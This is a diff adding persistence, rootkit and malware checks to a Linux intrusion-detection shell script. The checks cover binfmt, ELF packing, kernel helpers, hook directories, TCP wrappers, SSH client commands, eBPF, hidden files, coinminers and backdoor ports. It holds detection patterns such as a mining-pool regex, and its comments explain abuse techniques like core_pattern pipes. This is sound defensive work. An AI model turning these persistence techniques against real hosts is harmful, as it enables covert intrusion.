+                    "$name" "interpreter=$interp flags=${flags:-none} magic=${magic:0:64}$note; every execve of a matching file runs this" \
+                    review_binfmt ;;
+        esac
+    done
+
+    # systemd-binfmt replays these at boot, so the on-disk form is the
+    # persistent half of the same technique.
+    local c
+    for c in "$ROOT"/etc/binfmt.d/*.conf "$ROOT"/run/binfmt.d/*.conf \
+             "$ROOT"/usr/lib/binfmt.d/*.conf "$ROOT"/usr/local/lib/binfmt.d/*.conf; do
+        [[ -f $c && -r $c ]] || continue
+        while IFS= read -r line || [[ -n $line ]]; do
+            case $line in ''|'#'*) continue ;; esac
+            n=$((n + 1))
+            # :name:type:offset:magic:mask:interpreter:flags
+            local -a parts=()
+            IFS=':' read -r -a parts <<< "$line"
+            interp=${parts[6]:-}
+            obs BINFMTD "$c" "$line"
+            [[ -n $interp ]] || continue
+            case $interp in
+                /usr/bin/*|/usr/sbin/*|/bin/*|/sbin/*|/usr/libexec/*|/usr/lib/*|/usr/lib64/*|/opt/*) ;;
+                *) finding BFM005 HIGH persistence likely \
+                       "binfmt.d config registers an interpreter outside the system binary directories" \
+                       "$c" "name=${parts[1]:-?} interpreter=$interp; replayed by systemd-binfmt at every boot" \
+                       review_binfmt ;;
+            esac
+        done < "$c"
+    done
+    ok BFM000 "$n binfmt_misc registrations and binfmt.d entries inventoried"
+}
+
+# ---------------------------------------------------------------------------
+# ELF structure and packer heuristics
+# ---------------------------------------------------------------------------
+# Structural, offline and signature-free: every rule below describes something
+# a compiler and linker do not emit, so the false-positive source is deliberate
+# packing and size-stripping rather than "looks a bit like malware".
+#
+# Input is a byte stream per file:  "@F <path>" then `od -An -v -tu1` output.
+# Only the first 8 KiB is retained for header parsing; the whole window (64 KiB)
+# is counted for entropy.
+read -r -d '' ELF_PROG <<'AWKEOF' || true
+BEGIN { OFS = "\t"; LIMIT = 8192 }
+
+function u16(o) { return byte[o] + byte[o+1]*256 }
+function u32(o) { return byte[o] + byte[o+1]*256 + byte[o+2]*65536 + byte[o+3]*16777216 }
+function u64(o) { return u32(o) + u32(o+4)*4294967296 }
+function xbit(f) { return f % 2 }
+function wbit(f) { return int(f/2) % 2 }
+
+function fin(id, sev, conf, title, ev) {
+    print "FIND", id, sev, "binary", conf, title, path, ev, "inspect_binary"
+}
+
+function flush(   i, o, cl, data, etype, phoff, phnum, phsz, shoff, shnum,
+                  t, fl, has_interp, has_dynamic, rwx, ent, pr, marker, sev, shape) {
+    if (!open) return
+    open = 0
+    if (n < 64) return
+    if (!(byte[0] == 127 && byte[1] == 69 && byte[2] == 76 && byte[3] == 70)) return
+    nelf++
+    cl = byte[4]; data = byte[5]
+    if (data != 1) {
+        fin("ELF000", "INFO", "possible", "Big-endian ELF not parsed by this check",
+            "EI_DATA=" data "; structural rules skipped for this file")
+        return
+    }
+    if (cl == 2)      { etype=u16(16); phoff=u64(32); shoff=u64(40); phsz=u16(54); phnum=u16(56); shnum=u16(60) }
+    else if (cl == 1) { etype=u16(16); phoff=u32(28); shoff=u32(32); phsz=u16(42); phnum=u16(44); shnum=u16(48) }
+    else return
+
+    for (i = 0; i < phnum && i < 128; i++) {
+        o = phoff + i * phsz
+        if (o < 0 || o + 32 > nb) break
+        t = u32(o)
+        fl = (cl == 2) ? u32(o+4) : u32(o+24)
+        if (t == 3) has_interp = 1
+        if (t == 2) has_dynamic = 1
+        if (t == 1 && xbit(fl) && wbit(fl)) rwx = 1
+    }
+
+    # "UPX!" appears in the packer's own header and again in its trailer.
+    for (i = 0; i + 3 < nb; i++)
+        if (byte[i]==85 && byte[i+1]==80 && byte[i+2]==88 && byte[i+3]==33) { marker = "UPX!"; break }
+
+    ent = 0
+    for (i = 0; i < 256; i++)
+        if (cnt[i] > 0) { pr = cnt[i]/n; ent -= pr * log(pr)/log(2) }
+    ent = int(ent * 100) / 100
+
+    shape = "class=" (cl==2?"ELF64":"ELF32") " type=" etype " phnum=" phnum \
+            " shnum=" shnum " entropy=" ent "/8.00 window=" n "B"
+
+    if (marker != "")
+        fin("ELF001", "HIGH", "likely", "Executable is packed with UPX",
+            shape "; \"UPX!\" marker present. Packing is legal but hides the binary from string and hash inspection; unpack with `upx -d` on a copy before judging it")
+    if (shoff == 0 || shnum == 0)
+        fin("ELF002", "MED", "likely", "ELF section header table has been removed",
+            shape "; no linker produces this - it is the signature of sstrip or a packer, and it defeats objdump/readelf/nm")
+    # ET_DYN covers both PIEs and shared libraries, and every library
+    # legitimately lacks PT_INTERP - so only ET_EXEC can be judged here.
+    if (etype == 2 && has_dynamic && !has_interp)
+        fin("ELF003", "MED", "possible", "Dynamically linked ELF declares no program interpreter",
+            shape "; PT_DYNAMIC without PT_INTERP. Static-PIE and some loaders are legitimate; a self-loading dropper is not")
+    if (rwx)
+        fin("ELF004", "HIGH", "possible", "ELF load segment is both writable and executable",
+            shape "; RWX PT_LOAD. Toolchains have not emitted this by default for years; runtime code patching and unpacking stubs do")
+    if (ent > 7.2 && n >= 4096) {
+        sev = (marker != "" || shnum == 0 || rwx) ? "HIGH" : "MED"
+        fin("ELF005", sev, "possible", "High byte entropy across the first " n " bytes",
+            shape "; >7.20 means the header window is compressed, encrypted or packed. Legitimately compressed payloads and embedded archives reach this too")
+    }
+}
+
+/^@F / { flush(); path = substr($0, 4); gsub(/[\t\r\n]/, " ", path)
+         n = 0; nb = 0; open = 1
+         for (i = 0; i < 256; i++) cnt[i] = 0
+         next }
+
+open {
+    for (i = 1; i <= NF; i++) {
+        b = $i + 0
+        cnt[b]++
+        n++
+        if (nb < LIMIT) { byte[nb] = b; nb++ }
+    }
+}
+
+/^@TRUNC / { flush()
+              print "SKIP", "ELF000", "binary scan budget exceeded after " $2 \
+                    " of " $3 " candidates; remainder UNSCANNED"
+              next }
+
+END { flush() }
+AWKEOF
+
+# --- M24: packed and structurally anomalous binaries ------------------------
+# Candidate selection is deliberately NOT "every executable on the box":
+# packaged binaries under /usr/bin are covered by dpkg --verify / rpm -Va,
+# and reading 64 KiB of each of them buys nothing for the cost. The candidates
+# are the binaries those two checks cannot speak for.
+chk_elfscan() {
+    [[ $OPT_MODE == full ]] || { ok ELF000 "ELF structure and packer heuristics reserved for --full"; return; }
+    (( CAP_OD == 1 )) || { skip ELF000 "no od(1) with -v/-t; binary structure UNKNOWN"; return; }
+
+    local f exe pid n=0 start=$SECONDS
+    local -a cand=()
+    local -A seen=()
+
+    # 1. Everything currently running.
+    if (( CAP_PROC == 1 )); then
+        for pid in "${PROC_PIDS[@]}"; do
+            exe=${PROC_EXE[$pid]:-}
+            [[ -n $exe ]] || continue
+            exe=${exe%" (deleted)"}
+            [[ $exe == /* && -r $exe && -f $exe ]] || continue
+            [[ -n ${seen[$exe]:-} ]] && continue
+            seen[$exe]=1; cand+=("$exe")
+        done
+    fi
+    # 2. Executables the package manager does not vouch for, plus everything
+    #    executable in a transient directory.
+    for f in "${FILES[@]}"; do
+        [[ -f $f && -x $f && ! -L $f ]] || continue
+        [[ -n ${seen[$f]:-} ]] && continue
+        logical_path "$f"
+        if is_transient_path "$LOGICAL" || is_user_path "$LOGICAL"; then :
+        else
+            case $LOGICAL in
+                /usr/local/*|/opt/*|/srv/*) ;;
+                *) continue ;;
+            esac
+        fi
+        (( ${FILE_SIZES[$f]:-0} > 0 )) || continue
+        seen[$f]=1; cand+=("$f")
+    done
+
+    if (( ${#cand[@]} == 0 )); then
+        ok ELF000 "no candidate binaries outside package-managed directories"
+        return
+    fi
+    if (( ${#cand[@]} > MAX_PER_CAT )); then
+        skip ELF000 "candidate binaries capped at $MAX_PER_CAT of ${#cand[@]}; remainder UNSCANNED"
+        cand=("${cand[@]:0:$MAX_PER_CAT}")
+    fi
+
+    # One awk for the whole set; one od per file, which is unavoidable because
+    # od concatenates its inputs without a separator. The truncation notice
+    # travels IN the stream: the producing loop runs in a pipeline subshell,
+    # so a counter incremented there would be lost to the caller.
+    {
+        for f in "${cand[@]}"; do
+            if (( SECONDS - start >= STAGE_SECONDS )); then
+                printf '@TRUNC %d %d\n' "$n" "${#cand[@]}"
+                break
+            fi
+            logical_path "$f"
+            printf '@F %s\n' "$LOGICAL"
+            run_bounded 3 od -An -v -tu1 -N 65536 -- "$f" 2>/dev/null
+            n=$((n + 1))
+        done
+    } | awk "$ELF_PROG"
+
+    ok ELF001 "${#cand[@]} candidate binaries submitted: running executables plus unpackaged and transient-path executables. Packaged content under /usr/bin is covered by package verification instead of re-read here"
+}
+
+
+# --- M25: kernel-mediated command execution ---------------------------------
+# Every path here names a program the KERNEL runs, as root, with no unit, no
+# parent and no log line. core_pattern is the standout: a value beginning "|"
+# means the next segfault on the box executes the attacker's program. These are
+# runtime writes to procfs, so nothing on disk records them.
+chk_kernel_exec() {
+    local row path expect sev desc value n=0 flagged=0 full
+    while IFS='|' read -r path expect sev desc; do
+        [[ -n $path ]] || continue
+        case $path in /proc/*) full="$PROCFS${path#/proc}" ;; *) full="$ROOT$path" ;; esac
+        [[ -r $full ]] || continue
+        IFS= read -r value < "$full" 2>/dev/null || continue
+        n=$((n + 1))
+        obs KERNELEXEC "$path" "${value:-<empty>}"
+
+        case $path in
+            */core_pattern)
+                case $value in
+                    '|'*)
+                        # systemd-coredump and apport are the two legitimate pipes.
+                        case $value in
+                            *systemd-coredump*|*apport*|*/usr/share/apport/*) 
+                                finding KEX001 INFO persistence confirmed \
+                                    "Core dumps are piped to a known crash handler" "$path" "$value" - ;;
+                            *)  flagged=$((flagged + 1))
+                                finding KEX002 CRIT persistence confirmed \
+                                    "Core dumps are piped to an unrecognised program, which the kernel runs as root" \
+                                    "$path" "$value; $desc" review_kernel_exec ;;
+                        esac ;;
+                esac ;;
+            */uevent_helper|*/hotplug)
+                [[ -z ${value// /} ]] && continue
+                flagged=$((flagged + 1))
+                finding KEX003 CRIT persistence confirmed \
+                    "Kernel uevent/hotplug helper is set" "$path" "$value; $desc" review_kernel_exec ;;
+            */binfmt_misc/status) ;;
+            *)
+                [[ -n $expect && $value == "$expect" ]] && continue
+                [[ -z ${value// /} ]] && continue
+                flagged=$((flagged + 1))
+                finding KEX004 "$sev" persistence confirmed \
+                    "Kernel helper program differs from the distribution default" \
+                    "$path" "value=$value expected=$expect; $desc" review_kernel_exec ;;
+        esac
+    done <<< "$SIG_KERNEL_EXEC"
+
+    # The on-disk half: a sysctl file that restores a hostile value at boot.
+    local f line key val
+    for f in "$ROOT/etc/sysctl.conf" "$ROOT"/etc/sysctl.d/*.conf \
+             "$ROOT"/usr/lib/sysctl.d/*.conf "$ROOT"/run/sysctl.d/*.conf; do
+        [[ -f $f && -r $f ]] || continue
+        while IFS= read -r line || [[ -n $line ]]; do
+            case $line in ''|'#'*|';'*) continue ;; esac
+            key=${line%%=*}; val=${line#*=}
+            key=${key//[[:space:]]/}; val=${val# }
+            case $key in
+                kernel.core_pattern|kernel.modprobe|kernel.poweroff_cmd|kernel.hotplug)
+                    obs SYSCTLEXEC "$f" "$key=$val"
+                    case $val in
+                        '|'*|*systemd-coredump*|/sbin/modprobe|/sbin/poweroff) ;;
+                        *) finding KEX005 HIGH persistence likely \
+                               "sysctl configuration sets a kernel helper program" \
+                               "$f" "$key=$val; reapplied at every boot" review_kernel_exec ;;
+                    esac
+                    case $val in
+                        '|'*) case $val in *systemd-coredump*|*apport*) ;;
+                              *) finding KEX006 CRIT persistence likely \
+                                     "sysctl configuration pipes core dumps to a program" \
+                                     "$f" "$key=$val; reapplied at every boot" review_kernel_exec ;; esac ;;
+                    esac ;;
+            esac
+        done < "$f"
+    done
+    ok KEX000 "$n kernel execution handlers read from the live kernel; $flagged differ from distribution defaults"
+}
+
+# --- M26: directories that are executed automatically ------------------------
+# Persistence that is neither cron nor a unit, so it survives a review of both:
+# network hooks, sleep/shutdown hooks, display-manager hooks, package-manager
+# hooks, run-parts directories. The check inventories every entry and scores
+# the ones that are new, writable, or carry a remote-fetch/reverse-shell
+# command, using the same command rules as cron and units.
+chk_autorun_dirs() {
+    local d dir f n=0 dirs=0 flagged=0 line mode uid content
+    local -A seen=()
+    (( CAP_STAT == 1 )) || skip AUT003 "no working stat(1); ownership and permissions of auto-executed directories UNKNOWN - only their command content is scored"
+    while IFS= read -r d; do
+        [[ -n $d ]] || continue
+        dir="$ROOT$d"
+        [[ -d $dir ]] || continue
+        [[ -n ${seen[$dir]:-} ]] && continue
+        seen[$dir]=1
+        dirs=$((dirs + 1))
+
+        # A hook directory anyone but root can write to is a standing
+        # invitation, whether or not anything is in it yet. Judged from mode
+        # and ownership, never from the scanning user's own write access -
+        # "-w" would report a different answer depending on who ran the scan.
+        if (( CAP_STAT == 1 )); then
+            local duid
+            mode=$(stat -c '%a' -- "$dir" 2>/dev/null) || mode=""
+            duid=$(stat -c '%u' -- "$dir" 2>/dev/null) || duid=""
+            case $mode in
+                *[2367]) finding AUT004 HIGH persistence confirmed \
+                    "Auto-executed directory is world-writable" "$d" "mode=$mode" fix_perms
+                    flagged=$((flagged + 1)) ;;
+            esac
+            if [[ -n $duid && $duid != 0 ]]; then
+                finding AUT003 HIGH persistence confirmed \
+                    "Auto-executed directory is not owned by root" \
+                    "$d" "uid=$duid mode=${mode:-?}; that account can schedule root code here" fix_perms
+                flagged=$((flagged + 1))
+            fi
+        fi
+
+        for f in "$dir"/*; do
+            [[ -f $f ]] || continue
+            n=$((n + 1))
+            (( n <= MAX_PER_CAT * 4 )) || { skip AUT000 "auto-run inventory capped; truncated=1"; break 2; }
+            logical_path "$f"
+            mode=""; uid=""
+            if (( CAP_STAT == 1 )); then
+                mode=$(stat -c '%a' -- "$f" 2>/dev/null)
+                uid=$(stat -c '%u' -- "$f" 2>/dev/null)
+            fi
+            obs AUTORUN "$LOGICAL" "mode=${mode:-?} uid=${uid:-?}"
+
+            case $mode in
+                *[2367]) finding AUT005 HIGH persistence confirmed \
+                    "World-writable file in an auto-executed directory" "$LOGICAL" "mode=$mode" fix_perms
+                    flagged=$((flagged + 1)) ;;
+            esac
+            [[ -n $uid && $uid != 0 ]] && {
+                finding AUT006 MED persistence possible \
+                    "Auto-executed file is not owned by root" "$LOGICAL" "uid=$uid mode=${mode:-?}" review_persistence
+                flagged=$((flagged + 1))
+            }
+            # Reuse the cron/unit command grammar: these files are scripts and
+            # the same rules that catch a curl-to-shell in a crontab catch it
+            # here. Emitted as RCLINE so RULES_PROG scores it.
+            [[ -r $f ]] || { skip AUT000 "unreadable auto-executed file: $LOGICAL"; continue; }
+            if (( CAP_STAT == 1 )); then
+                local size
+                size=$(stat -c '%s' -- "$f" 2>/dev/null) || size=0
+                (( size < 1048576 )) || { skip AUT000 "auto-executed file too large to read: $LOGICAL"; continue; }
+            fi
+            local lines=0
+            while IFS= read -r line || [[ -n $line ]]; do
+                lines=$((lines + 1)); (( lines <= 400 )) || break
+                case $line in ''|'#'*) continue ;; esac
+                obs RCLINE "$LOGICAL" "$line"
+            done < "$f"
+        done
+    done <<< "$SIG_AUTORUN_DIR"
+    ok AUT000 "$dirs auto-executed directories inventoried, $n entries, $flagged with ownership or permission problems; command content scored by the cron/unit rules"
+}
+
+# --- M27: TCP wrappers command execution ------------------------------------
+# hosts.allow accepts "spawn" and "twist", which run a shell command on every
+# matching connection. Old, still present on Debian and Ubuntu, and routinely
+# missed because nobody reads hosts.allow.
+chk_tcpwrappers() {
+    local f line n=0
+    for f in "$ROOT/etc/hosts.allow" "$ROOT/etc/hosts.deny"; do
+        [[ -f $f && -r $f ]] || continue
+        n=$((n + 1))
+        while IFS= read -r line || [[ -n $line ]]; do
+            case $line in ''|'#'*) continue ;; esac
+            obs TCPWRAP "$f" "$line"
+            case $line in
+                *spawn*|*twist*|*aclexec*)
+                    finding TCW001 CRIT persistence confirmed \
+                        "TCP wrappers rule executes a command on connection" \
+                        "$f" "$line; runs for every matching connection" review_persistence ;;
+            esac
+        done < "$f"
+    done
+    (( n == 0 )) && { ok TCW000 "no hosts.allow/hosts.deny present"; return; }
+    ok TCW000 "$n TCP wrappers files inspected for spawn/twist command execution"
+}
+
+# --- M28: SSH client-side command execution ---------------------------------
+# ProxyCommand and LocalCommand run on the CLIENT. A backdoor here fires
+# whenever an operator sshes out of the box - including the operator hunting
+# the intrusion.
+chk_ssh_client() {
+    local f line u h rest n=0
+    local -a files=("$ROOT/etc/ssh/ssh_config")
+    for f in "$ROOT"/etc/ssh/ssh_config.d/*; do [[ -f $f ]] && files+=("$f"); done
+    if [[ -r $ROOT/etc/passwd ]]; then
+        local -A done=()
+        while IFS=: read -r u _ _ _ _ h rest; do
+            [[ $h == /* ]] || continue
+            [[ -n ${done[$h]:-} ]] && continue
+            done[$h]=1
+            [[ -f "$ROOT$h/.ssh/config" ]] && files+=("$ROOT$h/.ssh/config")
+        done < "$ROOT/etc/passwd"
+    fi
+    for f in "${files[@]}"; do
+        [[ -f $f && -r $f ]] || continue
+        n=$((n + 1))
+        logical_path "$f"
+        while IFS= read -r line || [[ -n $line ]]; do
+            case $line in ''|'#'*|' '#*) continue ;; esac
+            case ${line,,} in
+                *proxycommand*|*localcommand*|*permitlocalcommand*|*match\ exec*)
+                    obs SSHCLIENT "$LOGICAL" "$line"
+                    finding SSC001 HIGH persistence likely \
+                        "SSH client configuration runs a local command" \
+                        "$LOGICAL" "$line; executes whenever this account sshes out" review_persistence ;;
+            esac
+        done < "$f"
+    done
+    (( n == 0 )) && { ok SSC000 "no SSH client configuration present"; return; }
+    ok SSC000 "$n SSH client configuration files inspected for ProxyCommand/LocalCommand execution"
+}
+
+# --- M29: eBPF and dynamic tracing ------------------------------------------
+# The current rootkit surface. An eBPF program can hide processes, filter
+# packets and rewrite syscall arguments without a kernel module, so none of the
+# module-list divergence checks see it. BPFDoor-class implants pair this with a
+# raw/packet socket and never listen on a TCP port at all.
+chk_ebpf() {
+    local n=0 f line
+    local bpffs="$ROOT/sys/fs/bpf"
+    if [[ -d $bpffs ]]; then
+        for f in "$bpffs"/*; do
+            [[ -e $f ]] || continue
+            n=$((n + 1))
+            logical_path "$f"
+            obs BPFPIN "$LOGICAL" pinned
+            finding BPF001 MED rootkit possible \
+                "Pinned eBPF object present" "$LOGICAL" \
+                "pinned BPF programs survive the loader exiting; Cilium, systemd and Docker also pin objects" review_bpf
+        done
+    fi
+    local tr="$ROOT/sys/kernel/debug/tracing"
+    [[ -d $tr ]] || tr="$ROOT/sys/kernel/tracing"
+    for f in "$tr/kprobe_events" "$tr/uprobe_events"; do
+        [[ -r $f ]] || continue
+        while IFS= read -r line || [[ -n $line ]]; do
+            [[ -n ${line// /} ]] || continue
+            n=$((n + 1))
+            obs TRACEPROBE "${f##*/}" "$line"
+            finding BPF002 HIGH rootkit possible \
+                "Dynamic ${f##*/} probe is installed" "${f##*/}" \
+                "$line; kprobes and uprobes can intercept and alter kernel and userspace calls" review_bpf
+        done < "$f"
+    done
+    if have bpftool && [[ -z $ROOT ]] && (( CAP_ROOT == 1 )); then
+        local count=0
+        while IFS= read -r line; do
+            case $line in
+                [0-9]*:*) count=$((count + 1)); obs BPFPROG "${line%%:*}" "$line" ;;
+            esac
+        done < <(run_bounded 5 bpftool prog list 2>/dev/null)
+        (( count > 0 )) && finding BPF003 INFO rootkit untrusted-source \
+            "eBPF programs loaded" "bpftool" "$count programs; compare against the baseline rather than judging in isolation" review_bpf
+        n=$((n + count))
+    else
+        skip BPF003 "bpftool unavailable, offline root, or unprivileged; loaded eBPF program list UNKNOWN"
+    fi
+    ok BPF000 "$n eBPF pins, tracing probes and programs inventoried; an unpinned program loaded by a live process is not visible here"
+}
+
+# --- M30: hidden files in system directories --------------------------------
+# A dot-file in a home directory is ordinary. A dot-file inside /usr/bin, /lib
+# or /etc is not: no package ships one, and it is the oldest trick there is for
+# parking a payload where ls does not show it.
+chk_hidden_system() {
+    local d f n=0 flagged=0
+    for d in "$ROOT/usr/bin" "$ROOT/usr/sbin" "$ROOT/bin" "$ROOT/sbin" \
+             "$ROOT/usr/lib" "$ROOT/usr/lib64" "$ROOT/usr/libexec" "$ROOT/lib" \
+             "$ROOT/etc" "$ROOT/var/tmp" "$ROOT/dev/shm" "$ROOT/opt" "$ROOT/srv" \
+             "$ROOT/usr/share" "$ROOT/var/www" "$ROOT/boot"; do
+        [[ -d $d ]] || continue
+        for f in "$d"/.[!.]* "$d"/..?*; do
+            [[ -e $f ]] || continue
+            n=$((n + 1))
+            logical_path "$f"
+            # /etc legitimately holds a handful of dot-files, and .. entries
+            # under a mount point are ordinary.
+            # Packaging conventions that legitimately produce dot-entries:
+            # portage/git keepers, RHEL placeholders, the Fedora build-id tree,
+            # etckeeper, overlayfs whiteouts and the FIPS kernel hmac.
+            case ${LOGICAL##*/} in
+                .keep|.keep_*|.gitkeep|.gitignore|.placeholder|.wh..wh.*|.wh.*) continue ;;
+            esac
+            case $LOGICAL in
+                /etc/.pwd.lock|/etc/.updated|/etc/.java*|/etc/.etckeeper|/etc/.git*|\
+                /usr/lib/.build-id*|/usr/lib64/.build-id*|/usr/share/.build-id*|\
+                /usr/share/.*cache*|/usr/share/.mono*|/boot/.vmlinuz*) continue ;;
+            esac
+            flagged=$((flagged + 1))
+            obs HIDDENSYS "$LOGICAL" present
+            # A dot-entry in a binary or configuration directory is a much
+            # stronger statement than one under /usr/share or /opt, which are
+            # large and full of third-party trees.
+            local sev=HIGH
+            case $LOGICAL in /usr/share/*|/opt/*|/srv/*|/var/www/*) sev=MED ;; esac
+            if [[ -d $f ]]; then
+                finding HID001 "$sev" rootkit possible \
+                    "Hidden directory inside a system directory" "$LOGICAL" \
+                    "no distribution package ships a dot-directory here" inspect_file
+            else
+                finding HID002 "$sev" rootkit possible \
+                    "Hidden file inside a system directory" "$LOGICAL" \
+                    "no distribution package ships a dot-file here" inspect_file
+            fi
+        done
+    done
+    ok HID000 "$n hidden entries examined across system directories; $flagged reported"
+}
+
+# --- M31: coinminers ---------------------------------------------------------
+# The most common payload on a compromised competition host, and the one that
+# is loudest in a process list while being invisible to every persistence
+# check, because it is usually started by one of them rather than being one.
+chk_miner() {
+    local pid cmd exe n=0 pat hit
+    local -a pats=()
+    while IFS= read -r pat; do [[ -n $pat ]] && pats+=("$pat"); done <<< "$SIG_MINER"
+    if (( CAP_PROC == 1 )); then
+        for pid in "${PROC_PIDS[@]}"; do
+            cmd=${PROC_CMD[$pid]:-}; exe=${PROC_EXE[$pid]:-}
+            [[ -n $cmd ]] || continue
+            [[ $cmd == *bluesweep* ]] && continue
+            hit=""
+            for pat in "${pats[@]}"; do
+                if [[ $cmd =~ $pat ]]; then hit=$pat; break; fi
+            done
+            [[ -n $hit ]] || continue
+            n=$((n + 1))
+            finding MIN001 CRIT malware likely \
+                "Process command line matches a coinminer indicator" \
+                "pid=$pid ${PROC_COMM[$pid]:-}" "matched=$hit exe=$exe cmd=$cmd" capture_memory
+        done
+    else
+        skip MIN001 "no live process table; running coinminers UNKNOWN"
+    fi
+    # Miner configuration left on disk, in the bounded candidate set only.
+    local f
+    for f in "${CONFIG_FILES[@]}"; do
+        [[ -r $f && ! -L $f ]] || continue
+        (( ${FILE_SIZES[$f]:-0} < 262144 )) || continue
+        logical_path "$f"
+        while IFS= read -r pat; do
+            [[ -n $pat ]] || continue
+            case $pat in stratum*|*pool*|*xmr*) ;; *) continue ;; esac
+        done <<< "$SIG_MINER"
+        if run_bounded 2 awk 'BEGIN{r="stratum[+]tcp://|stratum[+]ssl://|donate-level|supportxmr|minexmr|nanopool|moneroocean|hashvault|c3pool"}
+                              $0 ~ r {exit 1}' "$f"; then :; else
+            n=$((n + 1))
+            finding MIN002 HIGH malware likely \
+                "Configuration file contains a mining pool or miner directive" \
+                "$LOGICAL" "matched offline indicator list; content withheld" inspect_file
+        fi
+    done
+    ok MIN000 "$n coinminer indicators across process command lines and candidate configuration files"
+}
+
+# --- M32: known-backdoor listening ports -------------------------------------
+# A weak signal on its own - these are ordinary high ports too - so it is
+# reported at INFO and exists to add evidence to a listener that some other
+# check has already scored.
+chk_backdoor_ports() {
+    if (( ${#LISTEN_ROWS[@]} == 0 )); then
+        ok BDP000 "no listening sockets to compare against the known-port list"
+        return
+    fi
+    local -A bad=()
+    local p row proto addr port uid ino pid n=0
+    while IFS= read -r p; do [[ -n $p ]] && bad[$p]=1; done <<< "$SIG_BADPORT"
+    for row in "${LISTEN_ROWS[@]}"; do
+        IFS='|' read -r proto addr port uid ino <<< "$row"
+        [[ -n ${bad[$port]:-} ]] || continue
+        n=$((n + 1))
+        pid=${SOCK_PID[$ino]:-}
+        finding BDP001 INFO network possible \
+            "Listener on a port commonly used by backdoors and handlers" \
+            "$proto $addr:$port" \
+            "pid=${pid:-unknown} ${PROC_COMM[${pid:-0}]:-} exe=${PROC_EXE[${pid:-0}]:-unknown}; port number alone proves nothing - weigh it with the LSN001 score for the same process" \
+            review_unknown_service
+    done
+    ok BDP000 "$n listeners on the known-backdoor port list; port heuristics are evidence, never a verdict"
+}
+
 # ---------------------------------------------------------------------------
 # driver
 # ---------------------------------------------------------------------------
@@ -1793,7 +3136,10 @@ CHECKS_QUICK="chk_ldpreload chk_hidden_pid chk_deleted_exe chk_listeners
 chk_cron chk_systemd chk_authkeys chk_sshd chk_accounts chk_shellrc
 chk_agents chk_file_metadata chk_configs chk_webshell chk_logs chk_kernel
 chk_hardening chk_services chk_packages chk_hunt chk_extra_procs chk_sessions
-chk_capabilities chk_weak_passwords chk_artifacts chk_agent_enrollment chk_ssh_locations chk_privilege_paths chk_container_surface chk_acl chk_stored_credentials chk_package_inventory chk_host_inventory chk_process_mappings chk_session_sockets chk_auth_events"
+chk_capabilities chk_weak_passwords chk_artifacts chk_agent_enrollment chk_ssh_locations chk_privilege_paths chk_container_surface chk_acl chk_stored_credentials chk_package_inventory chk_host_inventory chk_process_mappings chk_session_sockets chk_auth_events
+chk_provenance chk_unowned_listener chk_outbound chk_binfmt chk_elfscan
+chk_kernel_exec chk_autorun_dirs chk_tcpwrappers chk_ssh_client chk_ebpf
+chk_hidden_system chk_miner chk_backdoor_ports"
 
 collect_all() {
     local host when os kern priv
@@ -1825,11 +3171,12 @@ collect_all() {
     meta container "$IN_CONTAINER"
     meta root "${ROOT:-/}"
     meta trust "kernel observations plus untrusted userland tools; shell/interpreter may also be tampered"
-    meta caps "proc=$CAP_PROC printf=$CAP_FIND_PRINTF stat=$CAP_STAT ps=$CAP_PS hash=${CAP_HASH:-none}"
+    meta caps "proc=$CAP_PROC printf=$CAP_FIND_PRINTF stat=$CAP_STAT ps=$CAP_PS hash=${CAP_HASH:-none} od=$CAP_OD pkgq=${CAP_PKGQ:-none}"
 
     col_proc
     col_net
     run_check col_fs
+    col_prov
 
     local c
     local total_budget=60 budget rc
@@ -1837,7 +3184,7 @@ collect_all() {
     for c in $CHECKS_QUICK; do
         budget=$((total_budget - SECONDS + SCAN_START))
         if (( budget <= 0 )); then skip "$c" "overall $OPT_MODE budget exceeded; results INCOMPLETE"; continue; fi
-        case $c in chk_webshell|chk_file_metadata|chk_packages|chk_weak_passwords) (( budget > 60 )) && budget=60 ;;
+        case $c in chk_webshell|chk_file_metadata|chk_packages|chk_weak_passwords|chk_elfscan) (( budget > 60 )) && budget=60 ;;
             *) (( budget > STAGE_SECONDS )) && budget=$STAGE_SECONDS ;;
         esac
         run_bounded "$budget" run_check "$c"; rc=$?
@@ -1923,6 +3270,25 @@ selftest_assert() {
     fi
 }
 
+# Synthetic ELF64 image as od-style decimal, for exercising ELF_PROG without
+# shipping a binary fixture. 120 bytes: a 64-byte header plus one program
+# header. $1 e_shoff  $2 e_shnum  $3 p_flags  $4 optional trailing bytes.
+elf_fixture() {
+    local shoff=$1 shnum=$2 pflags=$3 extra=${4:-} i out
+    out="127 69 76 70 2 1 1 0 0 0 0 0 0 0 0 0"      # e_ident: ELF64, little-endian
+    out="$out 2 0 62 0 1 0 0 0"                     # e_type=ET_EXEC, e_machine, e_version
+    out="$out 0 0 0 0 0 0 0 0"                      # e_entry
+    out="$out 64 0 0 0 0 0 0 0"                     # e_phoff = 64
+    out="$out $((shoff % 256)) 0 0 0 0 0 0 0"       # e_shoff
+    out="$out 0 0 0 0"                              # e_flags
+    out="$out 64 0 56 0 1 0 64 0"                   # ehsize, phentsize=56, phnum=1, shentsize
+    out="$out $((shnum % 256)) 0 0 0"               # e_shnum, e_shstrndx
+    out="$out 1 0 0 0 $pflags 0 0 0"                # PT_LOAD with p_flags
+    for ((i = 0; i < 48; i++)); do out="$out 0"; done
+    [[ -z $extra ]] || out="$out $extra"
+    printf '%s\n' "$out"
+}
+
 selftest_unit() (
     local TEST_FAILURES=0 result rc
     selftest_assert ipv4-loopback "$(hex2ip 0100007F)" 127.0.0.1
@@ -1997,6 +3363,71 @@ FIXTURES
     selftest_assert stopped-agent-drift "$result" CRIT
     result=$(printf 'OBS\tFILE\t/etc/passwd\t644:0:0:20:1:abc\nMARK\nOBS\tFILE\t/etc/passwd\t644:0:0:20:2:abc\n' | awk "$DIFF_PROG" | awk -F '\t' '$1=="FIND"{print $3}')
     selftest_assert mtime-only-drift "$result" MED
+    # --- binary structure (ELF_PROG) ---------------------------------------
+    result=$({ printf '@F /tmp/fixture\n'; elf_fixture 0 0 7; } | awk "$ELF_PROG" |
+        awk -F '\t' '$1=="FIND"{printf "%s ", $2}')
+    selftest_assert elf-stripped-and-rwx "$result" 'ELF002 ELF004 '
+    result=$({ printf '@F /tmp/fixture\n'; elf_fixture 200 20 5; } | awk "$ELF_PROG" |
+        awk -F '\t' '$1=="FIND"{print $2}')
+    selftest_assert elf-clean "$result" ''
+    result=$({ printf '@F /tmp/fixture\n'; elf_fixture 200 20 5 '85 80 88 33'; } | awk "$ELF_PROG" |
+        awk -F '\t' '$1=="FIND"{print $2}')
+    selftest_assert elf-upx "$result" ELF001
